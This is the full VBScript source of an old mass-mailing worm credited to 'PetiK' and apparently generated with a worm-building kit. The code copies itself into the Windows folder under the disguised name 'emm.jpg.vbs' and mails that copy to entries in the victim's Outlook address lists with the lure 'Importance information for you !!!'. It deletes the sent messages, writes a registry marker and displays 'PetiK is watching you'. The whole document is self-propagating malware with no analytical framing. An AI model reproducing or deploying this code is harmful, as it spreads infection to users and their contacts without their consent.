   'VBS/EMM by PetiK
   On Error Resume Next
   Set ws = CreateObject("Wscript.Shell")
   Set look = ws.RegRead("HKEY_CURRENT_USER\Software\emm\")
   If (look="") Then
   Set fso = CreateObject("Scripting.FileSystemObject")
   fso.CopyFile Wscript.ScriptFullName, fso.GetSpecialFolder(0) & "\emm.jpg.vbs"
   Set out = Wscript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   For lists = 1 to mapi.AddressLists.Count
   Set lists2 = mapi.AddressLists(lists)
   x=1
   recips = lists2.AddressEntries(x)
   Set email = out.CreateItem(0)
   email.Recipients.Add(recips)
   email.Subject = "Hey you !!!"
   email.Body = "Importance information for you !!!"
   email.Attachments.Add "C:\WINDOWS\emm.jpg.vbs"
   email.DeleteAfterSubmit = True
   email.Send
   Next
   ws.RegWrite "HKEY_CURRENT_USER\Software\emm\", "Worm written with Vbs Worms Coder 1.0"
   MsgBox("PetiK is watching you")
   End If
   'Vbs Worms Coder 1.0 - J Wallace
